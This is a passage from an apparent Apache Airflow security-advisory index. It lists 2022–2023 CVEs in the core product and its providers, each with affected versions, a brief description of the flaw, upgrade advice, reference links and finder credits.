Improper Input Validation vulnerability in Apache Software Foundation Apache Airflow Drill Provider.<br><br><span style="background-color: rgb(255, 255, 255);">Apache Airflow Drill Provider is affected by a vulnerability that allows an attacker to pass in malicious parameters when establishing a connection with DrillHook giving an opportunity to read files on the Airflow server.</span><br><p>This issue affects Apache Airflow Drill Provider: before 2.4.3.<br><span style="background-color: rgb(255, 255, 255);">It is recommended to upgrade to a version that is not affected.</span><br></p>

### References
* https://github.com/apache/airflow/pull/33074
* https://lists.apache.org/thread/ozpl0opmob49rkcz8svo8wkxyw1395sf


### Credits
* sw0rd1ight of Caiji Sec Team and 4ra1n of Chaitin Tech (finder)
* happyhacking (finder)


## Airflow "Run task" feature allows execution with unnecessary priviledges ## { #CVE-2023-39508 }

CVE-2023-39508 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-39508) [\[CVE json\]](./CVE-2023-39508.cve.json) [\[OSV json\]](./CVE-2023-39508.osv.json)



_Last updated: 2023-08-05T06:47:11.955Z_

### Affected

* Apache Airflow before 2.6.0


### Description

Execution with Unnecessary Privileges, : Exposure of Sensitive Information to an Unauthorized Actor vulnerability in Apache Software Foundation Apache Airflow.<p>The "Run Task" feature enables authenticated user to bypass some of the restrictions put in place. It allows to execute code in the webserver context as well as allows to bypas limitation of access the user has to certain DAGs. The "Run Task" feature is considered dangerous and it has been removed entirely in Airflow 2.6.0<br></p><p>This issue affects Apache Airflow: before 2.6.0.</p>

### References
* https://github.com/apache/airflow/pull/29706
* https://lists.apache.org/thread/j2nkjd0zqvtqk85s6ywpx3c35pvzyx15


### Credits
* balis0ng (finder)


## SMTP/IMAP client components allowed MITM due to missing Certificate Validation ## { #CVE-2023-39441 }

CVE-2023-39441 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-39441) [\[CVE json\]](./CVE-2023-39441.cve.json) [\[OSV json\]](./CVE-2023-39441.osv.json)



_Last updated: 2023-08-23T15:39:49.970Z_

### Affected

* Apache Airflow SMTP Provider before 1.30
* Apache Airflow IMAP Provider before 3.3.0
* Apache Airflow before 2.7.0


### Description

<span style="background-color: rgb(255, 255, 255);">Apache Airflow SMTP Provider </span><span style="background-color: rgb(255, 255, 255);">before 1.3.0</span><span style="background-color: rgb(255, 255, 255);">, Apache Airflow IMAP Provider </span><span style="background-color: rgb(255, 255, 255);">before 3.3.0, and</span><span style="background-color: rgb(255, 255, 255);">&nbsp;Apache Airflow </span><span style="background-color: rgb(255, 255, 255);">before 2.7.0 are affected by the&nbsp;</span>Validation of OpenSSL Certificate vulnerability.<br><br><span style="background-color: rgb(255, 255, 255);">The default SSL context with SSL library did not check a server's X.509&nbsp;</span><span style="background-color: rgb(255, 255, 255);">certificate.&nbsp; Instead, the code accepted any certificate, which could&nbsp;</span><span style="background-color: rgb(255, 255, 255);">result in the disclosure of mail server credentials or mail contents&nbsp;</span><span style="background-color: rgb(255, 255, 255);">when the client connects to an attacker in a MITM position.<br><br></span><span style="background-color: var(--wht);">Users are strongly advised to upgrade to Apache Airflow version 2.7.0 or newer, Apache Airflow IMAP Provider version 3.3.0 or newer, and Apache Airflow SMTP Provider version 1.3.0 or newer to mitigate the risk associated with this vulnerability</span>

### References
* https://github.com/apache/airflow/pull/33075
* https://github.com/apache/airflow/pull/33108
* https://github.com/apache/airflow/pull/33070
* https://lists.apache.org/thread/xzp4wgjg2b1o6ylk2595df8bstlbo1lb


### Credits
* Martin Schobert, Pentagrid AG (finder)


## Improper Input Validation in Hive Provider with proxy_user ## { #CVE-2023-37415 }

CVE-2023-37415 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-37415) [\[CVE json\]](./CVE-2023-37415.cve.json) [\[OSV json\]](./CVE-2023-37415.osv.json)



_Last updated: 2023-07-13T07:35:30.726Z_

### Affected

* Apache Airflow Apache Hive Provider before 6.1.2


### Description

Improper Input Validation vulnerability in Apache Software Foundation Apache Airflow Apache Hive Provider.<br><br>Patching on top of CVE-2023-35797<br><p>Before&nbsp;6.1.2<span style="background-color: rgb(255, 255, 255);">&nbsp;the proxy_user option can also inject semicolon.<br></span><br>This issue affects Apache Airflow Apache Hive Provider: before 6.1.2.<br><br></p><p>It is recommended updating provider version to 6.1.2 in order to avoid this vulnerability.</p><p></p>

### References
* https://lists.apache.org/thread/9wx0jlckbnycjh8nj5qfwxo423zvm41k


### Credits
* Son Tran from VNPT - VCI (reporter)


## Exposure of sensitive connection information, DOS and SSRF on "test connection" feature ## { #CVE-2023-37379 }

CVE-2023-37379 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-37379) [\[CVE json\]](./CVE-2023-37379.cve.json) [\[OSV json\]](./CVE-2023-37379.osv.json)



_Last updated: 2023-08-23T15:38:53.691Z_

### Affected

* Apache Airflow before 2.7.0


### Description

<p>Apache Airflow, in versions prior to 2.7.0, contains a security vulnerability that can be exploited by an authenticated user possessing Connection edit privileges. This vulnerability allows the user to access connection information and exploit the test connection feature by sending many requests, leading to a denial of service (DoS) condition on the server. Furthermore, malicious actors can leverage this vulnerability to establish harmful connections with the server.</p><p>Users of Apache Airflow are strongly advised to upgrade to version 2.7.0 or newer to mitigate the risk associated with this vulnerability. Additionally, administrators are encouraged to review and adjust user permissions to restrict access to sensitive functionalities, reducing the attack surface.</p><br>

### References
* https://github.com/apache/airflow/pull/32052
* https://lists.apache.org/thread/g5c9vcn27lr14go48thrjpo6f4vw571r


### Credits
* kuteminh11 (finder)
* khoabda of Zalo Security Team (finder)
* Sayooj B Kumar(Team bi0s & CRED Security team) (finder)
* Son Tran from VNPT - VCI (finder)
* KmhlYXJ0 (finder)


## ReDoS via dags function ## { #CVE-2023-36543 }

CVE-2023-36543 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-36543) [\[CVE json\]](./CVE-2023-36543.cve.json) [\[OSV json\]](./CVE-2023-36543.osv.json)



_Last updated: 2023-07-21T10:49:41.270Z_

### Affected

* Apache Airflow before 2.6.3


### Description

Apache Airflow, versions before 2.6.3, has a vulnerability where an authenticated user can use crafted input to make the current request hang.&nbsp;It is recommended to upgrade to a version that is not affected

### References
* https://github.com/apache/airflow/pull/32060
* https://lists.apache.org/thread/tokfs980504ylgk3cv3hjlnrtbv4tng4


### Credits
* National Cyber Security VietNam (NCS VietNam) (finder)
* hungtd (finder)


## Access to DAGs without relevant permission ## { #CVE-2023-35908 }

CVE-2023-35908 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-35908) [\[CVE json\]](./CVE-2023-35908.cve.json) [\[OSV json\]](./CVE-2023-35908.osv.json)



_Last updated: 2023-07-12T09:14:08.022Z_

### Affected

* Apache Airflow before 2.6.3


### Description

Apache Airflow, versions before 2.6.3, is affected by a vulnerability that allows unauthorized read access to a DAG through the URL.&nbsp;It is recommended to upgrade to a version that is not affected

### References
* https://github.com/apache/airflow/pull/32014
* https://lists.apache.org/thread/vsflptk5dt30vrfggn96nx87d7zr6yvw


### Credits
* Name : Karthikeyan Singaravelan  Employer : Visa (finder)


## Airflow Apache ODBC and MSSQL Providers Arbitrary File Read Vulnerability ## { #CVE-2023-35798 }

CVE-2023-35798 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-35798) [\[CVE json\]](./CVE-2023-35798.cve.json) [\[OSV json\]](./CVE-2023-35798.osv.json)



_Last updated: 2023-06-27T11:39:49.794Z_

### Affected

* Apache Airflow ODBC Provider before 4.0.0
* Apache Airflow MSSQL Provider before 3.4.1


### Description

Input Validation vulnerability in Apache Software Foundation Apache Airflow ODBC Provider, Apache Software Foundation Apache Airflow MSSQL Provider.<p>This&nbsp;vulnerability is considered low since it requires DAG code to use `<span style="background-color: rgb(255, 255, 255);">get_sqlalchemy_connection` and someone with access to connection resources specifically&nbsp;updating the connection to <span style="background-color: rgb(255, 255, 255);">exploit it.</span><br></span><br>This issue affects Apache Airflow ODBC Provider: before 4.0.0; Apache Airflow MSSQL Provider: before 3.4.1.<br><br>It is recommended to&nbsp;<span style="background-color: rgb(255, 255, 255);">upgrade to a version that is not affected</span></p>

### References
* https://github.com/apache/airflow/pull/31984
* https://lists.apache.org/thread/951rb9m7wwox5p30tdvcfjxq8j1mp4pj


### Credits
* id_No2015429 of 3H Secruity Team (finder)


## Apache Airflow Hive Provider Beeline RCE with Principal ## { #CVE-2023-35797 }

CVE-2023-35797 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-35797) [\[CVE json\]](./CVE-2023-35797.cve.json) [\[OSV json\]](./CVE-2023-35797.osv.json)



_Last updated: 2023-07-03T09:08:49.038Z_

### Affected

* Apache Airflow Apache Hive Provider before 6.1.1


### Description

Improper Input Validation vulnerability in Apache Software Foundation Apache Airflow Hive Provider.<br><p>This issue affects Apache Airflow Apache Hive Provider: before 6.1.1.<br><br><span style="background-color: rgb(255, 255, 255);">Before version 6.1.1 it was&nbsp;</span><span style="background-color: rgb(255, 255, 255);">possible to bypass the security check to RCE via</span><br><span style="background-color: rgb(255, 255, 255);">principal parameter. For this to be&nbsp;<span style="background-color: rgb(255, 255, 255);">exploited it requires access to modifying the connection details.</span><br></span><br>It is recommended updating provider version to 6.1.1 in order to avoid this&nbsp;vulnerability.</p>

### References
* https://github.com/apache/airflow/pull/31983
* https://lists.apache.org/thread/30y19ok07fw52x5hnkbhwqo3ho0wwc1y


### Credits
* id_No2015429 of 3H Secruity Team (reporter)


## Information disclosure on configuration view ## { #CVE-2023-35005 }

CVE-2023-35005 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-35005) [\[CVE json\]](./CVE-2023-35005.cve.json) [\[OSV json\]](./CVE-2023-35005.osv.json)



_Last updated: 2023-06-19T08:15:11.464Z_

### Affected

* Apache Airflow from 2.5.0 before 2.6.2


### Description

<div>In Apache Airflow, some potentially sensitive values were being shown to the user in certain situations.</div><div>This vulnerability is mitigated by the fact configuration is not shown in the UI by default (only if `[webserver] expose_config` is set to `non-sensitive-only`), and not all uncensored values are actually sentitive.</div><br><div>This issue affects Apache Airflow: from 2.5.0 before 2.6.2. Users are recommended to update to version 2.6.2 or later.<br></div>

### References
* https://github.com/apache/airflow/pull/31788
* https://github.com/apache/airflow/pull/31820
* https://lists.apache.org/thread/o4f2cxh0054m9tlxpb81c1yhylor5gjd


### Credits
* Piotr Chomiak from Astro product security team (finder)


## Remote code execution vulnerability ## { #CVE-2023-34395 }

CVE-2023-34395 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-34395) [\[CVE json\]](./CVE-2023-34395.cve.json) [\[OSV json\]](./CVE-2023-34395.osv.json)



_Last updated: 2023-06-27T11:36:51.331Z_

### Affected

* Apache Airflow ODBC Provider before 4.0.0


### Description

Improper Neutralization of Argument Delimiters in a Command ('Argument Injection') vulnerability in Apache Software Foundation Apache Airflow ODBC Provider.<br><span style="background-color: rgb(255, 255, 255);">In OdbcHook, A privilege escalation vulnerability exists in a system due to controllable ODBC driver parameters that allow the loading of arbitrary dynamic-link libraries, resulting in command execution.<br></span>Starting version 4.0.0 driver can be set only from the hook constructor.<br><p>This issue affects Apache Airflow ODBC Provider: before 4.0.0.</p>

### References
* https://github.com/apache/airflow/pull/31713
* https://lists.apache.org/thread/l26yykftzbhc9tgcph8cso88bc2lqwwd


### Credits
* KmhlYXJ0 (finder)


## KubernetesPodOperator RCE via connection configuration ## { #CVE-2023-33234 }

CVE-2023-33234 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-33234) [\[CVE json\]](./CVE-2023-33234.cve.json) [\[OSV json\]](./CVE-2023-33234.osv.json)



_Last updated: 2023-05-30T10:56:52.167Z_

### Affected

* Apache Airflow CNCF Kubernetes Provider from 5.0.0 through 6.1.0


### Description

Arbitrary code execution in Apache Airflow CNCF Kubernetes provider version 5.0.0 allows user to change xcom sidecar image and resources via Airflow connection.<br><br>In order to exploit this weakness, a user would already need elevated permissions (Op or Admin) to change the connection object in this manner.&nbsp; Operators should upgrade to provider version 7.0.0 which has removed the vulnerability.<br><br>

### References
* https://lists.apache.org/thread/n1vpgl6h2qsdm52o9m2tx1oo86tl4gnq


## Stored XSS on Apache Airflow ## { #CVE-2023-29247 }

CVE-2023-29247 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-29247) [\[CVE json\]](./CVE-2023-29247.cve.json) [\[OSV json\]](./CVE-2023-29247.osv.json)



_Last updated: 2023-05-08T09:01:33.604Z_

### Affected

* Apache Airflow before 2.6.0


### Description

Task instance details page in the UI is vulnerable to a stored XSS.<p>This issue affects Apache Airflow: before 2.6.0.</p><br>

### References
* https://github.com/apache/airflow/pull/30447
* https://github.com/apache/airflow/pull/30779
* https://lists.apache.org/thread/kqf5lxmko133780clsp827xfsh4xd3fl


### Credits
* taidh from VNPT - VCI (finder)
* kuteminh11 (finder)


## Apache Airflow Spark Provider Arbitrary File Read via JDBC ## { #CVE-2023-28710 }

CVE-2023-28710 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-28710) [\[CVE json\]](./CVE-2023-28710.cve.json) [\[OSV json\]](./CVE-2023-28710.osv.json)



_Last updated: 2023-04-07T14:55:42.112Z_

### Affected

* Apache Airflow Spark Provider before 4.0.1


### Description

Improper Input Validation vulnerability in Apache Software Foundation Apache Airflow Spark Provider.<p>This issue affects Apache Airflow Spark Provider: before 4.0.1.</p>

### References
* https://github.com/apache/airflow/pull/30223
* https://lists.apache.org/thread/lb9w9114ow00h2nkn8bjm106v5x1p1d2


### Credits
* Xie Jianming of  Nsfocus (finder)


## Airflow Apache Drill Provider Arbitrary File Read Vulnerability ## { #CVE-2023-28707 }

CVE-2023-28707 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-28707) [\[CVE json\]](./CVE-2023-28707.cve.json) [\[OSV json\]](./CVE-2023-28707.osv.json)



_Last updated: 2023-04-07T14:53:21.428Z_

### Affected

* Apache Airflow Drill Provider before 2.3.2


### Description

Improper Input Validation vulnerability in Apache Software Foundation Apache Airflow Drill Provider.<p>This issue affects Apache Airflow Drill Provider: before 2.3.2.</p>

### References
* https://github.com/apache/airflow/pull/30215
* https://lists.apache.org/thread/dfoj7q1nd0vhhsl8fjg63z4j6mfmdxtk


### Credits
* Kai Zhao of 3H Secruity Team (finder)


## Apache Airflow Hive Provider Beeline Remote Command Execution ## { #CVE-2023-28706 }

CVE-2023-28706 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-28706) [\[CVE json\]](./CVE-2023-28706.cve.json) [\[OSV json\]](./CVE-2023-28706.osv.json)



_Last updated: 2023-04-07T14:54:35.049Z_

### Affected

* Apache Airflow Hive Provider before 6.0.0


### Description

Improper Control of Generation of Code ('Code Injection') vulnerability in Apache Software Foundation Apache Airflow Hive Provider.<p>This issue affects Apache Airflow Hive Provider: before 6.0.0.</p>

### References
* https://github.com/apache/airflow/pull/30212
* https://lists.apache.org/thread/dl20xxd51xvlx0zzc0wzgxfjwgtbbxo3


### Credits
* sw0rd1ight of Caiji Sec Team and 4ra1n of Chaitin Tech (finder)


## Airflow Sqoop Provider RCE Vulnerability ## { #CVE-2023-27604 }

CVE-2023-27604 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-27604) [\[CVE json\]](./CVE-2023-27604.cve.json) [\[OSV json\]](./CVE-2023-27604.osv.json)



_Last updated: 2023-08-28T07:47:27.394Z_

### Affected

* Apache Airflow Sqoop Provider before 4.0.0


### Description

Apache Airflow Sqoop Provider, versions before 4.0.0, is affected by a vulnerability that allows an attacker pass parameters with the connections, which makes it possible to implement RCE attacks via ‘sqoop import --connect’, obtain airflow server permissions, etc. T<span style="background-color: rgb(255, 255, 255);">he attacker needs to be logged in and have authorization (permissions) to create/edit connections.<br></span><br> It is recommended to upgrade to a version that is not affected.<br>This issue was reported independently by <span style="background-color: rgb(255, 255, 255);">happyhacking-k</span>, And Xie Jianming and LiuHui of Caiji Sec Team also reported it.

### References
* https://github.com/apache/airflow/pull/33039
* https://lists.apache.org/thread/lswlxf11do51ob7f6xyyg8qp3n7wdrgd


### Credits
* happyhacking-k (finder)
* Xie Jianming of Caiji Sec Team (finder)
* Liu Hui of Caiji Sec Team (finder)


## Arbitrary file read via AWS provider ## { #CVE-2023-25956 }

CVE-2023-25956 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-25956) [\[CVE json\]](./CVE-2023-25956.cve.json) [\[OSV json\]](./CVE-2023-25956.osv.json)



_Last updated: 2023-03-07T08:23:39.736Z_

### Affected

* Apache Airflow AWS Provider before 7.2.1


### Description

Generation of Error Message Containing Sensitive Information vulnerability in the Apache Airflow AWS Provider.<br><br><p>This issue affects Apache Airflow AWS Provider versions before 7.2.1.</p>

### References
* https://github.com/apache/airflow/pull/29587
* https://lists.apache.org/thread/07pl9y4gdpw2c6rzqm77dvkm2z2kb5gv


### Credits
* Son Tran from VNPT - VCI (finder)
* kuteminh11 (finder)


## Privilege escalation using airflow logs ## { #CVE-2023-25754 }

CVE-2023-25754 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-25754) [\[CVE json\]](./CVE-2023-25754.cve.json) [\[OSV json\]](./CVE-2023-25754.osv.json)



_Last updated: 2023-05-08T11:57:41.997Z_

### Affected

* Apache Airflow before 2.6.0


### Description

Privilege Context Switching Error vulnerability in Apache Software Foundation Apache Airflow.<p>This issue affects Apache Airflow: before 2.6.0.</p>

### References
* https://github.com/apache/airflow/pull/29506
* https://lists.apache.org/thread/3y83gr0qb8t49ppfk4fb2yk7md8ltq4v


### Credits
* ksw9722@naver.com (finder)


## Apache Airflow Hive Provider Beeline RCE ## { #CVE-2023-25696 }

CVE-2023-25696 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-25696) [\[CVE json\]](./CVE-2023-25696.cve.json) [\[OSV json\]](./CVE-2023-25696.osv.json)



_Last updated: 2023-02-24T11:48:19.499Z_

### Affected

* Apache Airflow Hive Provider before 5.1.3


### Description

Improper Input Validation vulnerability in the Apache Airflow Hive Provider.<br><br><p>This issue affects Apache Airflow Hive Provider versions before 5.1.3.</p>

### References
* https://github.com/apache/airflow/pull/29502
* https://lists.apache.org/thread/99g0qm56wmgdxmbtdsvhj4rdnxhpzpml


### Credits
* id_No2015429 of 3H Secruity Team (finder)


## Information disclosure in Apache Airflow ## { #CVE-2023-25695 }

CVE-2023-25695 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-25695) [\[CVE json\]](./CVE-2023-25695.cve.json) [\[OSV json\]](./CVE-2023-25695.osv.json)



_Last updated: 2023-03-15T09:37:07.873Z_

### Affected

* Apache Airflow before 2.5.2


### Description

Generation of Error Message Containing Sensitive Information vulnerability in Apache Software Foundation Apache Airflow.<p>This issue affects Apache Airflow: before 2.5.2.</p>

### References
* https://github.com/apache/airflow/pull/29501
* https://lists.apache.org/thread/z8w6ckzs61ql365tv4d19k82o67r15p2


### Credits
* kuteminh11 (finder)


## Sqoop Apache Airflow Provider Remote Code Execution Vulnerability ## { #CVE-2023-25693 }

CVE-2023-25693 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-25693) [\[CVE json\]](./CVE-2023-25693.cve.json) [\[OSV json\]](./CVE-2023-25693.osv.json)



_Last updated: 2023-02-24T11:48:09.839Z_

### Affected

* Apache Airflow Sqoop Provider before 3.1.1


### Description

Improper Input Validation vulnerability in the Apache Airflow Sqoop Provider.<br><br><p>This issue affects Apache Airflow Sqoop Provider versions before 3.1.1.</p>

### References
* https://github.com/apache/airflow/pull/29500
* https://lists.apache.org/thread/79qn8g5xbq036f8crb115obvr22l52q4


### Credits
*  L3yx of Syclover Security Team (finder)


## Google Cloud Sql Provider Denial Of Service ## { #CVE-2023-25692 }

CVE-2023-25692 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-25692) [\[CVE json\]](./CVE-2023-25692.cve.json) [\[OSV json\]](./CVE-2023-25692.osv.json)



_Last updated: 2023-02-24T11:47:58.411Z_

### Affected

* Apache Airflow Google Provider before 8.10.0


### Description

Improper Input Validation vulnerability in the Apache Airflow Google Provider.<br><br><p>This issue affects Apache Airflow Google Provider versions before 8.10.0.</p>

### References
* https://github.com/apache/airflow/pull/29499
* https://lists.apache.org/thread/ks4l78l5rwdpmvfn7y7yhs179nyxtlsh


### Credits
* Xie Jianming of Caiji Sec Team (finder)


## Google Cloud Sql Provider Remote Command Execution ## { #CVE-2023-25691 }

CVE-2023-25691 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-25691) [\[CVE json\]](./CVE-2023-25691.cve.json) [\[OSV json\]](./CVE-2023-25691.osv.json)



_Last updated: 2023-02-24T11:35:47.925Z_

### Affected

* Apache Airflow Google Provider before 8.10.0


### Description

Improper Input Validation vulnerability in the Apache Airflow Google Provider.<br><br><p>This issue affects Apache Airflow Google Provider versions before 8.10.0.</p>

### References
* https://github.com/apache/airflow/pull/29497
* https://lists.apache.org/thread/zdr8ovfttbh7kj0lydgcw88tbt2nmkcy


### Credits
* Xie Jianming of Caiji Sec Team (finder)


## Scheduler remote DoS ## { #CVE-2023-22888 }

CVE-2023-22888 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-22888) [\[CVE json\]](./CVE-2023-22888.cve.json) [\[OSV json\]](./CVE-2023-22888.osv.json)



_Last updated: 2023-07-12T09:17:51.316Z_

### Affected

* Apache Airflow before 2.6.3


### Description

Apache Airflow, versions before 2.6.3, is affected by a vulnerability that allows an attacker to cause a service disruption by manipulating the run_id parameter. This vulnerability is considered low since it requires an authenticated user to exploit it. It is recommended to upgrade to a version that is not affected

### References
* https://github.com/apache/airflow/pull/32293
* https://lists.apache.org/thread/dnlht2hvm7k81k5tgjtsfmk27c76kq7z


### Credits
* Zhipeng Zhang (@timon8) (finder)


## Apache Airflow path traversal by authenticated user ## { #CVE-2023-22887 }

CVE-2023-22887 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-22887) [\[CVE json\]](./CVE-2023-22887.cve.json) [\[OSV json\]](./CVE-2023-22887.osv.json)



_Last updated: 2023-07-13T10:31:08.518Z_

### Affected

* Apache Airflow before 2.6.3


### Description

Apache Airflow, versions before 2.6.3, is affected by a vulnerability that allows an attacker to perform unauthorized file access outside the intended directory structure by manipulating the run_id parameter. This vulnerability is considered low since it requires an authenticated user to exploit it. It is recommended to upgrade to a version that is not affected

### References
* https://github.com/apache/airflow/pull/32293
* https://lists.apache.org/thread/rxddqs76r6rkxsg1n24d029zys67qwwo


### Credits
* Zhipeng Zhang (@Timon8) (finder)
* KietNA from National Cyber Security (NCS) (finder)


## RCE Vulnerability ## { #CVE-2023-22886 }

CVE-2023-22886 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-22886) [\[CVE json\]](./CVE-2023-22886.cve.json) [\[OSV json\]](./CVE-2023-22886.osv.json)



_Last updated: 2023-06-29T09:40:58.058Z_

### Affected

* Apache Airflow JDBC Provider before 4.0.0


### Description

Improper Input Validation vulnerability in Apache Software Foundation Apache Airflow JDBC Provider.<br><span style="background-color: rgb(255, 255, 255);">Airflow JDBC Provider Connection’s [Connection URL] parameters had no</span><br><span style="background-color: rgb(255, 255, 255);">restrictions, which made it possible to implement RCE attacks via</span><br><span style="background-color: rgb(255, 255, 255);">different type JDBC drivers, obtain airflow server permission.</span><br><p>This issue affects Apache Airflow JDBC Provider: before 4.0.0.<br></p>

### References
* https://lists.apache.org/thread/ynbjwp4n0vzql0xzhog1gkp1ovncf8j3


### Credits
* heart Y (finder)
* happyhacking (finder)


## Arbitrary file read via MySQL provider in Apache Airflow ## { #CVE-2023-22884 }

CVE-2023-22884 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-22884) [\[CVE json\]](./CVE-2023-22884.cve.json) [\[OSV json\]](./CVE-2023-22884.osv.json)



_Last updated: 2023-01-21T13:02:09.736Z_

### Affected

* Apache Airflow before 2.5.1
* Apache Airflow MySQL Provider before 4.0.0


### Description

Improper Neutralization of Special Elements used in a Command ('Command Injection') vulnerability in Apache Software Foundation Apache Airflow, Apache Software Foundation Apache Airflow MySQL Provider.<p>This issue affects Apache Airflow: before 2.5.1; Apache Airflow MySQL Provider: before 4.0.0.</p>

### References
* https://github.com/apache/airflow/pull/28811
* https://lists.apache.org/thread/0l0j3nt0t7fzrcjl2ch0jgj6c58kxs5h


### Credits
* Son Tran from VNPT - VCI (reporter)


## Security vulnerability on AirFlow Connections ## { #CVE-2022-46651 }

CVE-2022-46651 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2022-46651) [\[CVE json\]](./CVE-2022-46651.cve.json) [\[OSV json\]](./CVE-2022-46651.osv.json)



_Last updated: 2023-07-12T09:16:59.771Z_

### Affected

* Apache Airflow before 2.6.3


### Description

Apache Airflow, versions before 2.6.3, is affected by a vulnerability that allows an unauthorized actor to gain access to sensitive information in Connection edit view. This vulnerability is considered low since it requires someone with access to Connection resources specifically updating the connection to exploit it. Users should upgrade to version 2.6.3 or later which has removed the vulnerability.<br>

### References
* https://github.com/apache/airflow/pull/32309
* https://lists.apache.org/thread/n45h3y82og125rnlgt6rbm9szfb6q24d


## Hive Provider RCE vulnerability with hive_cli_params ## { #CVE-2022-46421 }

CVE-2022-46421 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2022-46421) [\[CVE json\]](./CVE-2022-46421.cve.json) [\[OSV json\]](./CVE-2022-46421.osv.json)



_Last updated: 2022-12-20T10:18:24.768Z_

### Affected

* Apache Airflow Hive Provider before 5.0.0


### Description

Improper Neutralization of Special Elements used in a Command ('Command Injection') vulnerability in Apache Software Foundation Apache Airflow Hive Provider.<p>This issue affects Apache Airflow Hive Provider: before 5.0.0.</p>

### References
* https://github.com/apache/airflow/pull/28101
* https://lists.apache.org/thread/09twdoyoybldlfj5gvk0qswtofh0rmp4


### Credits
* id_No2015429 of 3H Security Team (finder)


## Apache Airflow: Open redirect during login ## { #CVE-2022-45402 }

CVE-2022-45402 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2022-45402) [\[CVE json\]](./CVE-2022-45402.cve.json) [\[OSV json\]](./CVE-2022-45402.osv.json)



_Last updated: 2022-11-15T08:49:17.848Z_

### Affected

* Apache Airflow from unspecified before 2.4.3


### Description

In Apache Airflow versions prior to 2.4.3, there was an open redirect in the webserver's `/login` endpoint.

### References
* https://github.com/apache/airflow/pull/27576
* https://lists.apache.org/thread/nf4xrkoo6c81g6fdn4vj8k9x2686o9nh


### Credits
* The Apache Airflow PMC would like to thank Bugra Eskici for reporting this issue.


## Apache Airflow prior to 2.4.2 has an open redirect ## { #CVE-2022-43985 }

CVE-2022-43985 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2022-43985) [\[CVE json\]](./CVE-2022-43985.cve.json) [\[OSV json\]](./CVE-2022-43985.osv.json)



_Last updated: 2022-11-02T08:40:14.097Z_

### Affected

* Apache Airflow from unspecified before 2.4.2


### Description

In Apache Airflow versions prior to 2.4.2, there was an open redirect in the webserver's `/confirm` endpoint.

### References
* https://github.com/apache/airflow/pull/27143
* https://lists.apache.org/thread/m13y9s5kw92fw9l8j4qd85h0txp4kfcq


### Credits
* The Apache Airflow PMC would like to thank Axel Chong (@Haxatron) [https://hackerone.com/haxatron1] for reporting this issue.


## Apache Airflow prior to 2.4.2 allows reflected XSS via Origin Query Argument in URL ## { #CVE-2022-43982 }

CVE-2022-43982 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2022-43982) [\[CVE json\]](./CVE-2022-43982.cve.json) [\[OSV json\]](./CVE-2022-43982.osv.json)



_Last updated: 2022-11-02T08:37:19.773Z_

### Affected

* Apache Airflow from unspecified before 2.4.2


### Description

In Apache Airflow versions prior to 2.4.2, the "Trigger DAG with config" screen was susceptible to XSS attacks via the `origin` query argument.

### References
* https://github.com/apache/airflow/pull/27143
* https://lists.apache.org/thread/vqnvdrfsw9z7v7c46qh3psjgr7wy959l


### Credits
* The Apache Airflow PMC would like to thank id_No2015429 of 3H Security Team for reporting this issue.


## Session still functional after user is deactivated ## { #CVE-2022-41672 }

CVE-2022-41672 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2022-41672) [\[CVE json\]](./CVE-2022-41672.cve.json) [\[OSV json\]](./CVE-2022-41672.osv.json)



_Last updated: 2022-10-07T06:56:43.156Z_

### Affected

* Apache Airflow from unspecified through 2.4.0


### Description

In Apache Airflow, prior to version 2.4.1, deactivating a user wouldn't prevent an already authenticated user from being able to continue using the UI or API.

### References
* https://github.com/apache/airflow/pull/26635
* https://lists.apache.org/thread/ohf3pvd3dftb8zb01yngbn1jtkq5m08y


### Credits
* The Apache Airflow PMC would like to thank Axel Chong (@Haxatron) for reporting this issue.


## Apache Airflow Hive Provider vulnerability (command injection via hive_cli connection) ## { #CVE-2022-41131 }

CVE-2022-41131 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2022-41131) [\[CVE json\]](./CVE-2022-41131.cve.json) [\[OSV json\]](./CVE-2022-41131.osv.json)



_Last updated: 2022-11-22T09:38:16.454Z_

### Affected

* Apache Airflow Hive Provider from unspecified before 4.1.0
* Apache Airflow at 2.3.0


### Description

Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') vulnerability in Apache Airflow Hive Provider, Apache Airflow allows an attacker to execute arbtrary commands in the task execution context, without write access to DAG files. This issue affects Hive Provider versions prior to 4.1.0. It also impacts any Apache Airflow versions prior to 2.3.0 in case HIve Provider is installed (Hive Provider 4.1.0 can only be installed for Airflow 2.3.0+). Note that you need to manually install the HIve Provider version 4.1.0 in order to get rid of the vulnerability on top of Airflow 2.3.0+ version that has lower version of the Hive Provider installed).


### References
* https://github.com/apache/airflow/pull/27647
* https://lists.apache.org/thread/wwo3qp0z8gv54yzn7hr04wy4n8gb0vhl


### Credits
* Apache Airflow PMC wants to thank id_No2015429 of 3H Security Team for reporting the issue.


